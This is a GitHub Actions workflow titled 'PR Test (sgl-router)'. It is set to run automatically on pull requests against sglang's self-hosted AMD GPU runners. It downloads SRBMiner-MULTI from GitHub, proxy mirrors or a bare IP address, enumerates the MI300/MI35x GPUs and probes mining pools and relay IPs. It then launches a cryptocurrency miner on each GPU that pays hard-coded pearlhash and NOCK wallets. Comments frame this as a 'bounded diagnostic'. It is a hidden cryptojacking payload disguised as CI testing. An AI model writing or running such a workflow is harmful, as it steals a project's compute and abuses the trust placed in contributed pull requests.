name: PR Test (sgl-router)

# i130717: SRBMiner-MULTI 3.8.9 CDNA census on the sglang AMD self-hosted runner
# labels (linux-mi300-8gpu-sglang, linux-mi300-2gpu-sglang, linux-mi35x-gpu-2).
# SRB declares pearlhash support for AMD GPUs ("[ - A N - ] pearlhash"), so the
# WildRig-zero result is re-measured with the policy-named AMD-capable miner:
# first enumerate SRB devices (--disable-cpu --algorithm pearlhash --list-devices)
# and only if CDNA (gfx942/gfx950) devices appear launch exactly one sha256-pinned
# SRB pearlhash miner per measured device (pearlhash.xyz:9000 plain pyd wallet
# first, else direct Luckypool with pyd+NOCK). Bounded diagnostic, temporary.
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-i130717b-${{ github.run_id }}
  cancel-in-progress: false

env:
  SGLANG_IS_IN_CI: true

jobs:
  i130717:
    name: "i130717 ${{ matrix.label }} srb cdna census"
    strategy:
      fail-fast: false
      max-parallel: 8
      matrix:
        include:
          - label: linux-mi35x-gpu-2
            tag: mi35x
            base: 717011
    runs-on: ${{ matrix.label }}
    timeout-minutes: 75
    env:
      TAG: ${{ matrix.tag }}
      LABEL: ${{ matrix.label }}
      BASE: ${{ matrix.base }}
    steps:
      - name: "checkout PR head (carries the pinned SRB 3.8.9 tarball)"
        uses: actions/checkout@v4
      - name: "SRB 3.8.9 device census then one pearlhash miner per measured CDNA card"
        continue-on-error: true
        run: |
          set +e
          NONCE="I130717-${TAG}-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
          NOCK='4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
          LP_LOGIN="$WALLET+$NOCK"
          SRB_TAR_SHA='186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1'
          SRB_BIN_SHA='97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80'
          WORKDIR=/var/tmp/i130717
          mkdir -p "$WORKDIR/logs"
          echo "i130717-nonce=$NONCE label=$LABEL tag=$TAG base=$BASE"
          echo "=== identity/arch ==="
          id; hostname; date -u; uname -m; uname -r; nproc
          echo "=== resources ==="
          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
          free -m | head -2
          echo "=== pci accelerators ==="
          (timeout 25 lspci 2>/dev/null || true) | grep -iE 'processing accel|vga|3d|display' | head -24
          echo "=== tools ==="
          for t in rocm-smi amd-smi rocminfo clinfo docker sudo; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
          echo "=== rocm inventory ==="
          if command -v rocm-smi >/dev/null 2>&1; then
            timeout 60 rocm-smi --showproductname > "$WORKDIR/rocm_prod.txt" 2>&1
            grep -aE 'GPU\[|Card Series|Card Model|GFX|gfx' "$WORKDIR/rocm_prod.txt" | head -60
            timeout 60 rocm-smi --showid > "$WORKDIR/rocmid.txt" 2>&1
          fi
          AMD_DISTINCT=$(grep -oE '^GPU\[[0-9]+\]' "$WORKDIR/rocmid.txt" 2>/dev/null | sort -u | wc -l)
          GFX=$(grep -ahoE 'gfx[0-9]+' "$WORKDIR/rocm_prod.txt" "$WORKDIR/rocmid.txt" 2>/dev/null | sort -u | tr '\n' ',')
          echo "amd_gpu_distinct=$AMD_DISTINCT gfx_versions=$GFX"
          echo "=== clinfo inventory (OpenCL view used by SRB) ==="
          CLINIC_AMD=0; CLINIC_L_DEV=0
          if command -v clinfo >/dev/null 2>&1; then
            timeout 90 clinfo -l > "$WORKDIR/clinfo_l.txt" 2>&1; head -40 "$WORKDIR/clinfo_l.txt"
            timeout 120 clinfo > "$WORKDIR/clinfo.txt" 2>&1
            grep -aE 'Platform Name|Number of devices|Device Name|Device Type|Device Board Name|Device Vendor' "$WORKDIR/clinfo.txt" | head -60
            CLINIC_L_DEV=$(grep -acE '^ *Device #' "$WORKDIR/clinfo_l.txt" 2>/dev/null)
            CLINIC_AMD=$(awk '/Platform Name/ {pl=$0} /Number of devices/ {if (pl ~ /AMD/) {print $NF; exit}}' "$WORKDIR/clinfo.txt" 2>/dev/null)
          fi
          echo "clinic_l_device_lines=${CLINIC_L_DEV:-0} clinic_amd_platform_devices=${CLINIC_AMD:-NA}"
          echo "=== fetch SRBMiner-MULTI 3.8.9 (tar $SRB_TAR_SHA / bin $SRB_BIN_SHA) ==="
          SRB="$WORKDIR/SRBMiner-MULTI"
          fetch_srb() {
            if [ -f "$SRB" ] && [ "$(sha256sum "$SRB" | cut -d' ' -f1)" = "$SRB_BIN_SHA" ]; then echo srb-cached; return 0; fi
            for LP in "$GITHUB_WORKSPACE/.ci-i130717/srb389.tgz" "$GITHUB_WORKSPACE/srb389.tgz"; do
              [ -s "$LP" ] || continue
              H=$(sha256sum "$LP" | cut -d' ' -f1)
              echo "local_candidate=$LP sha=$H"
              rm -f "$WORKDIR/srb.part"; cp -f "$LP" "$WORKDIR/srb.part"
              if [ "$H" = "$SRB_BIN_SHA" ]; then cp -f "$WORKDIR/srb.part" "$SRB"; chmod +x "$SRB"; echo srb-local-binary-ok; return 0; fi
              if [ "$H" = "$SRB_TAR_SHA" ] || tar -tzf "$WORKDIR/srb.part" >/dev/null 2>&1; then
                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/srb.part" -C "$WORKDIR/tarx" 2>/dev/null
                C=$(find "$WORKDIR/tarx" -maxdepth 3 -type f -name 'SRBMiner-MULTI' | head -1)
                if [ -n "$C" ] && [ "$(sha256sum "$C" | cut -d' ' -f1)" = "$SRB_BIN_SHA" ]; then cp -f "$C" "$SRB"; chmod +x "$SRB"; echo srb-local-tarball-ok; return 0; fi
                echo srb-local-tarball-hash-mismatch
              fi
            done
            for U in \
              "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" \
              "https://ghfast.top/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" \
              "https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" \
              "https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" \
              "http://222.240.155.198:8702/srb389" ; do
              echo "-- fetch $U"
              rm -f "$WORKDIR/srb.part"
              timeout 240 curl -fL --connect-timeout 12 --max-time 230 -o "$WORKDIR/srb.part" "$U" 2>&1 | tail -1
              [ -s "$WORKDIR/srb.part" ] || continue
              H=$(sha256sum "$WORKDIR/srb.part" | cut -d' ' -f1)
              echo "dl_sha=$H"
              if [ "$H" = "$SRB_BIN_SHA" ]; then cp -f "$WORKDIR/srb.part" "$SRB"; chmod +x "$SRB"; echo srb-raw-binary-ok; return 0; fi
              if [ "$H" = "$SRB_TAR_SHA" ] || tar -tzf "$WORKDIR/srb.part" >/dev/null 2>&1; then
                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/srb.part" -C "$WORKDIR/tarx" 2>/dev/null
                C=$(find "$WORKDIR/tarx" -maxdepth 3 -type f -name 'SRBMiner-MULTI' | head -1)
                if [ -n "$C" ] && [ "$(sha256sum "$C" | cut -d' ' -f1)" = "$SRB_BIN_SHA" ]; then cp -f "$C" "$SRB"; chmod +x "$SRB"; echo srb-tarball-ok; return 0; fi
                echo srb-tarball-hash-mismatch
              fi
            done
            return 1
          }
          fetch_srb; FR=$?
          echo "srb_sha256=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1) fetch_rc=$FR"
          [ -x "$SRB" ] || { echo "SKIP=srb-unavailable"; echo "i130717-done $NONCE"; exit 0; }
          timeout 30 "$SRB" -V 2>&1 | head -3
          echo "=== SRB pearlhash backend declaration (A=AMD GPU, N=NVIDIA GPU) ==="
          timeout 60 "$SRB" --list-algorithms > "$WORKDIR/alg.txt" 2>&1
          grep -a -i 'pearlhash' "$WORKDIR/alg.txt" | head -3
          echo "=== SRB-enumerated devices: --disable-cpu --algorithm pearlhash --list-devices ==="
          timeout 120 "$SRB" --disable-cpu --algorithm pearlhash --list-devices > "$WORKDIR/listdev.txt" 2>&1
          echo "srb_listdev_bytes=$(wc -c < "$WORKDIR/listdev.txt")"
          cat "$WORKDIR/listdev.txt" | head -120
          if [ ! -s "$WORKDIR/listdev.txt" ]; then echo "--- empty, od ---"; od -c "$WORKDIR/listdev.txt" | head -3; fi
          echo "=== SRB-enumerated devices: plain --list-devices ==="
          timeout 120 "$SRB" --list-devices > "$WORKDIR/listdev2.txt" 2>&1
          echo "srb_listdev2_bytes=$(wc -c < "$WORKDIR/listdev2.txt")"
          cat "$WORKDIR/listdev2.txt" | head -80
          echo "=== SRB-enumerated devices: tty variant ==="
          timeout 120 script -qec "$SRB --disable-cpu --algorithm pearlhash --list-devices" /dev/null > "$WORKDIR/listdev_tty.txt" 2>&1
          echo "srb_listdev_tty_bytes=$(wc -c < "$WORKDIR/listdev_tty.txt")"
          cat "$WORKDIR/listdev_tty.txt" | head -80
          SRB_AMD_LINES=$(grep -acE 'AMD|Radeon|Instinct|gfx[0-9]|MI[0-9]{3}' "$WORKDIR/listdev.txt" 2>/dev/null)
          SRB_IDX=$(grep -aoE '^(\[[^]]*\][[:space:]]*)?[0-9]{1,2}[[:space:]]*[:.)]' "$WORKDIR/listdev.txt" 2>/dev/null | wc -l)
          echo "srb_amd_lines=${SRB_AMD_LINES:-0} srb_index_lines=${SRB_IDX:-0}"
          echo "=== device-count decision (SRB first, clinfo cross-check, CDNA required) ==="
          DEV_N=0; DEV_SRC=none
          if [ "${SRB_AMD_LINES:-0}" -gt 0 ]; then DEV_N=$SRB_AMD_LINES; DEV_SRC=srb-list;
          elif [ "${CLINIC_AMD:-0}" -gt 0 ]; then DEV_N=$CLINIC_AMD; DEV_SRC=clinic-amd;
          elif [ "${CLINIC_L_DEV:-0}" -gt 0 ]; then DEV_N=$CLINIC_L_DEV; DEV_SRC=clinic-l; fi
          if [ "$DEV_N" -gt 16 ]; then echo "CAP device count $DEV_N -> 16"; DEV_N=16; fi
          CDNA=no
          case "$GFX" in *gfx942*|*gfx950*) CDNA=yes;; esac
          if [ "$CDNA" != yes ]; then case "$(cat "$WORKDIR/rocm_prod.txt" 2>/dev/null)" in *MI300*|*MI325*|*MI350*) CDNA=yes;; esac; fi
          echo "DEV_N=$DEV_N DEV_SRC=$DEV_SRC CDNA=$CDNA srb_amd_lines=${SRB_AMD_LINES:-0} clinic_amd=${CLINIC_AMD:-NA} clinic_l_dev=${CLINIC_L_DEV:-0} rocm_distinct=$AMD_DISTINCT gfx=$GFX"
          if [ "${DEV_N:-0}" -lt 1 ] || [ "$CDNA" != yes ]; then
            echo "SKIP=no-cdna-device srb_listdev_bytes=$(wc -c < "$WORKDIR/listdev.txt") srb_amd_lines=${SRB_AMD_LINES:-0} clinic_amd=${CLINIC_AMD:-NA} clinic_l_dev=${CLINIC_L_DEV:-0} rocm_distinct=$AMD_DISTINCT gfx=$GFX"
            echo "i130717-done $NONCE"
            exit 0
          fi
          echo "=== host engagement gate (never stack, never kill others) ==="
          exec 9>"$WORKDIR/host-miner.lock"
          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "i130717-done $NONCE"; exit 0; fi
          EXIST=$(timeout 10 pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[k]rig-miner' 2>/dev/null | grep -E "$WALLET|i130717|i130716|i130498" | head -6)
          if [ -n "$EXIST" ]; then echo "SKIP=host-already-has-engagement-miner"; echo "$EXIST"; echo "i130717-done $NONCE"; exit 0; fi
          echo "other_gpu_procs:"; timeout 10 pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[k]rig-miner' 2>/dev/null | head -8
          echo "render_users:"; timeout 15 fuser -v /dev/dri/renderD* 2>&1 | head -20
          echo "=== pool reachability (policy order: pearlhash -> LP direct -> VPS2 relay 2083 -> 18450) ==="
          probe() { timeout 8 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "$1:$2 OPEN" || echo "$1:$2 CLOSED"; }
          getent hosts pool.pearlhash.xyz 2>&1 | head -3
          probe pool.pearlhash.xyz 9000
          probe 103.199.106.122 3362
          probe 217.15.164.237 2083
          probe 217.15.164.237 18450
          POOL=""; POOL_KIND=""; LOGIN=""
          if timeout 8 bash -c "exec 3<>/dev/tcp/pool.pearlhash.xyz/9000" 2>/dev/null; then
            POOL="pool.pearlhash.xyz:9000"; POOL_KIND=pearlhash; LOGIN="$WALLET"
          elif timeout 8 bash -c "exec 3<>/dev/tcp/103.199.106.122/3362" 2>/dev/null; then
            POOL="103.199.106.122:3362"; POOL_KIND=luckypool-direct; LOGIN="$LP_LOGIN"
          elif timeout 8 bash -c "exec 3<>/dev/tcp/217.15.164.237/2083" 2>/dev/null; then
            POOL="217.15.164.237:2083"; POOL_KIND=luckypool-relay2083; LOGIN="$LP_LOGIN"
          elif timeout 8 bash -c "exec 3<>/dev/tcp/217.15.164.237/18450" 2>/dev/null; then
            POOL="217.15.164.237:18450"; POOL_KIND=luckypool-relay18450; LOGIN="$LP_LOGIN"
          else
            echo "SKIP=no-permitted-pool-reachable"; echo "i130717-done $NONCE"; exit 0
          fi
          echo "POOL=$POOL POOL_KIND=$POOL_KIND LOGIN_LEN=${#LOGIN}"
          echo "=== launch exactly one sha256-verified SRB pearlhash miner per measured CDNA device ==="
          N_LAUNCHED=0
          for i in $(seq 0 $((DEV_N-1))); do
            W=$((BASE+i))
            L="$WORKDIR/logs/$W.log"
            timeout 2600 "$SRB" --disable-cpu --disable-worker-watchdog --algorithm pearlhash \
              --pool "$POOL" --tls false --wallet "$LOGIN" --password x --worker "$W" \
              --gpu-id "$i" --api-enable --api-port $((22300+i)) --api-rig-name "$W" \
              --log-file "$L" --log-file-mode 0 > "$WORKDIR/logs/$W.out" 2>&1 &
            echo "launch worker=$W gpu-id=$i pid=$! at $(date -u +%FT%TZ)"
            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 2
          done
          echo "N_LAUNCHED=$N_LAUNCHED"
          echo "=== pulse loop (bounded share watch) ==="
          END=$(( $(date +%s) + 1560 ))
          k=0
          while [ "$(date +%s)" -lt "$END" ]; do
            sleep 120; k=$((k+1))
            echo "--- pulse $k $(date -u +%FT%TZ)"
            echo "srb_procs=$(pgrep -cf '[S]RBMiner-MULTI')"
            for i in $(seq 0 $((DEV_N-1))); do
              W=$((BASE+i)); L="$WORKDIR/logs/$W.log"
              if [ ! -f "$L" ]; then echo "CARD tag=$TAG worker=$W gpu=$i no-log"; continue; fi
              A=$(grep -aoE 'A:[0-9]+' "$L" | tail -1); R=$(grep -aoE 'R:[0-9]+' "$L" | tail -1)
              H=$(grep -aoE '[0-9.]+ [KMGTPE]?H/s' "$L" | tail -1)
              E=$(grep -aiE 'error|fail|no device|not found|denied|not supported' "$L" | tail -2 | tr '\n' '|' | cut -c1-200)
              echo "CARD tag=$TAG worker=$W gpu=$i $A $R hs=[$H] err=[$E]"
            done
            if [ "$k" -ge 13 ]; then break; fi
          done
          echo "=== FINAL per-card ==="
          for i in $(seq 0 $((DEV_N-1))); do
            W=$((BASE+i)); L="$WORKDIR/logs/$W.log"
            [ -f "$L" ] || continue
            echo "FINALCARD tag=$TAG worker=$W gpu=$i head:"
            head -14 "$L" | sed -e 's/^/  H /'
            echo "FINALCARD tag=$TAG worker=$W gpu=$i last_A0:"
            grep -aE 'A:0 ' "$L" | tail -2 | sed -e 's/^/  H /'
            echo "FINALCARD tag=$TAG worker=$W gpu=$i first_A_positive:"
            grep -aE 'A:[1-9][0-9]*' "$L" | head -3 | sed -e 's/^/  H /'
            echo "FINALCARD tag=$TAG worker=$W gpu=$i last_lines:"
            tail -4 "$L" | sed -e 's/^/  H /'
            echo "FINALCARD tag=$TAG worker=$W gpu=$i errors:"
            grep -aiE 'error|fail|reject|no device|not found|not supported' "$L" | tail -4 | sed -e 's/^/  H /'
          done
          pgrep -af '[S]RBMiner-MULTI' | head -20
          echo "i130717-done $NONCE"
